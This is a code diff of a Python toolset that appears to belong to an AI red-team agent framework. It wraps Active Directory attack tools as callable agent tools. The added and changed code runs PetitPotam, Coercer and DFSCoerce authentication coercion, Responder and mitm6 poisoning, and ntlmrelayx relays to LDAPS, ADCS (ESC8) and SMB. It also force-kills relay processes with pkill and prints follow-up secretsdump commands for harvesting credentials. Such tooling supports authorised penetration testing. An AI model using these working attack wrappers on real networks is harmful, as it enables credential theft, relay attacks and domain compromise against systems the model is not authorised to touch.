@@ -5,17 +5,65 @@ This module provides toolsets for:
 - Responder and mitm6 for capturing/relaying credentials
 """
 
-import logging
+import time
 
 import dreadnode as dn
 from dreadnode.agent.tools.base import Toolset
+from loguru import logger
 
 from ares.tools.red.common import (
     AnyRedTeamState,
     run_tool,
 )
 
-logger = logging.getLogger(__name__)
+
+def _kill_existing_relay_processes() -> str:
+    """Kill any existing ntlmrelayx/responder/mitm6 processes to free ports.
+
+    Returns:
+        Status message about what was killed.
+    """
+    killed = []
+
+    # Kill ntlmrelayx processes (|| true to suppress exit code 1 when no match)
+    # Use [n]tlmrelayx pattern so pkill doesn't match its own bash -c command line
+    try:
+        _stdout, _, _code = run_tool(
+            ["bash", "-c", "pkill -9 -f '[n]tlmrelayx' && echo killed || true"],
+            timeout_seconds=5,
+        )
+        if "killed" in _stdout:
+            killed.append("ntlmrelayx")
+    except Exception:
+        pass
+
+    # Kill responder processes (|| true to suppress exit code 1 when no match)
+    try:
+        _stdout, _, _code = run_tool(
+            ["bash", "-c", "pkill -9 -f 'R[e]sponder.py' && echo killed || true"],
+            timeout_seconds=5,
+        )
+        if "killed" in _stdout:
+            killed.append("responder")
+    except Exception:
+        pass
+
+    # Kill mitm6 processes (binds to DNS port 53)
+    try:
+        _stdout, _, _code = run_tool(
+            ["bash", "-c", "pkill -9 -f 'm[i]tm6' && echo killed || true"],
+            timeout_seconds=5,
+        )
+        if "killed" in _stdout:
+            killed.append("mitm6")
+    except Exception:
+        pass
+
+    if killed:
+        # Brief pause for ports to be released
+        time.sleep(1)
+        return f"Killed existing processes: {', '.join(killed)}"
+    return ""
 
 
 class CoercionTools(Toolset):
@@ -40,28 +88,7 @@ class CoercionTools(Toolset):
         password: str = "",
         domain: str = "",
     ) -> str:
-        """
-        Coerce NTLM authentication using PetitPotam (MS-EFSRPC).
-
-        PetitPotam forces a target to authenticate to your listener via EFSRPC.
-        Works unauthenticated on many unpatched systems, or authenticated on patched ones.
-
-        Use with ntlmrelayx to relay the authentication to LDAPS for RBCD/shadow creds.
-
-        Args:
-            target: Target machine IP to coerce
-            listener: Your listener IP (where auth will be sent)
-            username: Username for authenticated coercion (optional)
-            password: Password for authentication (optional)
-            domain: Domain for authentication (optional)
-
-        Returns:
-            PetitPotam coercion result
-
-        Example:
-            >>> petitpotam("192.168.58.10", "192.168.58.100")  # unauthenticated
-            >>> petitpotam("192.168.58.10", "192.168.58.100", "user", "pass", "domain.local")
-        """
+        """Coerce NTLM auth via MS-EFSRPC. Use with ntlmrelayx for relay attacks."""
         # Use coercer with MS-EFSR filter (same as PetitPotam) since petitpotam.py
         # may not be installed. Coercer is more reliable and widely available.
         cmd = [
@@ -108,25 +135,7 @@ class CoercionTools(Toolset):
         password: str = "",
         domain: str = "",
     ) -> str:
-        """
-        Coerce NTLM authentication using multiple methods (Coercer).
-
-        Coercer is a comprehensive coercion tool that tries multiple RPC methods
-        to force outbound authentication. More methods than PetitPotam alone.
-
-        Args:
-            target: Target machine IP to coerce
-            listener: Your listener IP (where auth will be sent)
-            username: Username for authentication (optional)
-            password: Password for authentication (optional)
-            domain: Domain for authentication (optional)
-
-        Returns:
-            Coercer results
-
-        Example:
-            >>> coercer("192.168.58.10", "192.168.58.100", "user", "pass", "domain.local")
-        """
+        """Try multiple RPC coercion methods (MS-EFSR, MS-RPRN, MS-DFSNM, etc.)."""
         cmd = ["coercer", "coerce", "-t", target, "-l", listener]
 
         if username and password:
@@ -153,6 +162,61 @@ class CoercionTools(Toolset):
         except Exception as e:
             return f"Coercer failed: {e}"
 
+    @dn.tool_method
+    def dfscoerce(
+        self,
+        target: str,
+        listener: str,
+        username: str = "",
+        password: str = "",
+        domain: str = "",
+    ) -> str:
+        """
+        Coerce NTLM authentication via MS-DFSNM (DFSCoerce).
+
+        Similar to PetitPotam but uses the DFS protocol (MS-DFSNM).
+        Use with ntlmrelayx for relay attacks to LDAPS, ADCS, or SMB.
+
+        Args:
+            target: Target machine to coerce (typically a DC)
+            listener: Attacker listener IP (running ntlmrelayx)
+            username: Username for authenticated coercion (optional)
+            password: Password for authentication (optional)
+            domain: Domain for authentication (optional)
+
+        Returns:
+            Coercion result indicating success or failure
+
+        Example:
+            >>> dfscoerce("192.168.58.10", "192.168.58.100")
+            >>> dfscoerce("192.168.58.10", "192.168.58.100", "user", "pass", "contoso.local")
+        """
+        cmd = ["dfscoerce", "-t", target, "-l", listener]
+
+        if username and password:
+            cmd.extend(["-u", username, "-p", password])
+            if domain:
+                cmd.extend(["-d", domain])
+
+        try:
+            logger.info(f"[*] Running DFSCoerce against {target}")
+            stdout, stderr, _ = run_tool(cmd, timeout_seconds=60)
+
+            result = stdout + "\n" + (stderr or "")
+
+            if "success" in result.lower() or "worked" in result.lower():
+                logger.info("[+] DFSCoerce coercion successful!")
+                result = (
+                    f"🚨 DFSCOERCE SUCCESSFUL!\n"
+                    f"→ Target {target} authenticating to {listener}\n"
+                    "→ Check ntlmrelayx/Responder for captured auth\n\n" + result
+                )
+
+            return result
+
+        except Exception as e:
+            return f"DFSCoerce failed: {e}"
+
 
 class CoercionNetworkTools(Toolset):
     """Tools for network-based authentication capture and relay.
@@ -172,24 +236,18 @@ class CoercionNetworkTools(Toolset):
         interface: str = "",
         analyze_mode: bool = False,
     ) -> str:
-        """
-        Start Responder to capture NTLM hashes from network traffic.
-
-        Responder poisons LLMNR, NBT-NS, and MDNS to capture NTLM hashes
-        from machines looking for network resources.
+        """Poison LLMNR/NBT-NS/MDNS to capture NetNTLMv2 hashes.
 
         Args:
-            interface: Network interface to listen on (auto-detected if empty)
-            analyze_mode: If True, only analyze without poisoning (safer)
-
-        Returns:
-            Responder status
-
-        Example:
-            >>> start_responder("ens5")
-            >>> start_responder("ens5", analyze_mode=True)
+            interface: Network interface (use value from task prompt, do NOT guess).
+            analyze_mode: Passive mode if True.
         """
         from ares.core.config import get_default_network_interface
+
+        # Kill any existing relay/responder processes to free ports
+        cleanup_msg = _kill_existing_relay_processes()
+        if cleanup_msg:
+            logger.info(f"[*] Cleanup: {cleanup_msg}")
 
         if not interface:
             interface = get_default_network_interface()
@@ -220,25 +278,18 @@ class CoercionNetworkTools(Toolset):
         domain: str,
         interface: str = "",
     ) -> str:
-        """
-        Start mitm6 for IPv6 DNS takeover attacks.
-
-        mitm6 exploits the default IPv6 settings in Windows to become a
-        rogue DHCPv6 server and DNS server, enabling credential theft.
-
-        Use with ntlmrelayx for complete attack chain.
+        """IPv6 DNS takeover via DHCPv6. Use with ntlmrelayx for relay.
 
         Args:
-            domain: Target domain for DNS takeover
-            interface: Network interface to listen on (auto-detected if empty)
-
-        Returns:
-            mitm6 status
-
-        Example:
-            >>> start_mitm6("domain.local", "ens5")
+            domain: Target domain.
+            interface: Network interface (use value from task prompt, do NOT guess).
         """
         from ares.core.config import get_default_network_interface
+
+        # Kill any existing mitm6/relay processes to free DNS port
+        cleanup_msg = _kill_existing_relay_processes()
+        if cleanup_msg:
+            logger.info(f"[*] Cleanup: {cleanup_msg}")
 
         if not interface:
             interface = get_default_network_interface()
@@ -265,24 +316,12 @@ class CoercionNetworkTools(Toolset):
         dc_ip: str,
         delegate_access: bool = True,
     ) -> str:
-        """
-        Start ntlmrelayx to relay NTLM auth to LDAPS for RBCD/shadow creds.
+        """Relay to LDAPS for RBCD attack. Creates machine account with --delegate-access."""
+        # Kill any existing relay processes to free ports
+        cleanup_msg = _kill_existing_relay_processes()
+        if cleanup_msg:
+            logger.info(f"[*] Cleanup: {cleanup_msg}")
 
-        Relays captured NTLM authentication to LDAPS for privilege escalation.
-        With --delegate-access, creates machine account for RBCD attack.
-
-        Combine with coercion tools (petitpotam, coercer) for full attack.
-
-        Args:
-            dc_ip: Domain controller IP to relay to
-            delegate_access: Enable RBCD delegation attack (default: True)
-
-        Returns:
-            ntlmrelayx status
-
-        Example:
-            >>> ntlmrelayx_to_ldaps("192.168.58.10")
-        """
         cmd = ["ntlmrelayx.py", "-t", f"ldaps://{dc_ip}", "--no-smb-server"]
 
         if delegate_access:
@@ -309,24 +348,12 @@ class CoercionNetworkTools(Toolset):
         ca_host: str,
         template: str = "DomainController",
     ) -> str:
-        """
-        Start ntlmrelayx to relay to ADCS Web Enrollment (ESC8).
+        """ESC8 relay to ADCS web enrollment. Coerce DC to get its certificate."""
+        # Kill any existing relay processes to free ports
+        cleanup_msg = _kill_existing_relay_processes()
+        if cleanup_msg:
+            logger.info(f"[*] Cleanup: {cleanup_msg}")
 
-        Relays captured NTLM auth to the ADCS HTTP enrollment endpoint
-        to request certificates as the relayed user/machine.
-
-        Combine with coercion against a DC to get domain admin cert.
-
-        Args:
-            ca_host: Certificate Authority hostname/IP
-            template: Certificate template to request (default: DomainController)
-
-        Returns:
-            ntlmrelayx status
-
-        Example:
-            >>> ntlmrelayx_to_adcs("CA01.domain.local", "DomainController")
-        """
         cmd = [
             "ntlmrelayx.py",
             "-t",
@@ -351,3 +378,105 @@ class CoercionNetworkTools(Toolset):
 
         except Exception as e:
             return f"ntlmrelayx to ADCS failed: {e}"
+
+    @dn.tool_method
+    def ntlmrelayx_to_smb(
+        self,
+        target_ip: str,
+        socks: bool = True,
+        interactive: bool = False,
+    ) -> str:
+        """Relay to SMB (requires signing disabled). SOCKS proxy for secretsdump."""
+        # Kill any existing relay processes to free ports
+        cleanup_msg = _kill_existing_relay_processes()
+        if cleanup_msg:
+            logger.info(f"[*] Cleanup: {cleanup_msg}")
+
+        cmd = [
+            "ntlmrelayx.py",
+            "-t",
+            f"smb://{target_ip}",
+            "-smb2support",
+        ]
+
+        if socks:
+            cmd.append("-socks")
+
+        if interactive:
+            cmd.extend(["-i", "-c", "whoami"])
+
+        try:
+            logger.info(f"[*] Starting ntlmrelayx targeting SMB on {target_ip}")
+            stdout, stderr, _ = run_tool(cmd, timeout_seconds=30)
+
+            result = stdout + "\n" + (stderr or "")
+
+            socks_msg = ""
+            if socks:
+                socks_msg = (
+                    "\n→ SOCKS proxy enabled!\n"
+                    "→ After relay succeeds:\n"
+                    "   proxychains secretsdump.py -no-pass DOMAIN/USER@TARGET\n"
+                    "   proxychains smbclient.py -no-pass DOMAIN/USER@TARGET\n"
+                )
+
+            return (
+                "📋 NTLMRELAYX TO SMB STARTED\n"
+                f"→ Relaying to smb://{target_ip}\n"
+                "→ REQUIRES: SMB signing disabled on target\n"
+                "→ Use petitpotam/coercer to trigger authentication\n"
+                f"{socks_msg}\n" + result
+            )
+
+        except Exception as e:
+            return f"ntlmrelayx to SMB failed: {e}"
+
+    @dn.tool_method
+    def ntlmrelayx_multirelay(
+        self,
+        targets_file: str | None = None,
+        target_ips: str | None = None,
+        dump_sam: bool = True,
+    ) -> str:
+        """Relay to multiple SMB targets. Provide targets_file or comma-separated target_ips."""
+        if not targets_file and not target_ips:
+            return "Error: Provide either targets_file or target_ips"
+
+        # Kill any existing relay processes to free ports
+        cleanup_msg = _kill_existing_relay_processes()
+        if cleanup_msg:
+            logger.info(f"[*] Cleanup: {cleanup_msg}")
+
+        cmd = [
+            "ntlmrelayx.py",
+            "-smb2support",
+            "-socks",
+        ]
+
+        if targets_file:
+            cmd.extend(["-tf", targets_file])
+        elif target_ips:
+            # Create temporary targets file
+            import tempfile
+
+            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
+                for ip in target_ips.split(","):
+                    f.write(f"{ip.strip()}\n")
+                targets_file = f.name
+            cmd.extend(["-tf", targets_file])
+
+        try:
+            logger.info("[*] Starting ntlmrelayx multi-target SMB relay")
+            stdout, stderr, _ = run_tool(cmd, timeout_seconds=30)
+
+            result = stdout + "\n" + (stderr or "")
+            return (
+                "📋 NTLMRELAYX MULTI-TARGET STARTED\n"
+                "→ Relaying to multiple SMB targets\n"
+                "→ SOCKS proxy enabled for relayed sessions\n"
+                "→ Use petitpotam/coercer to trigger authentication\n"
+                "→ Sessions will appear in socks proxy\n\n" + result
+            )
+
+        except Exception as e:
+            return f"ntlmrelayx multi-relay failed: {e}"
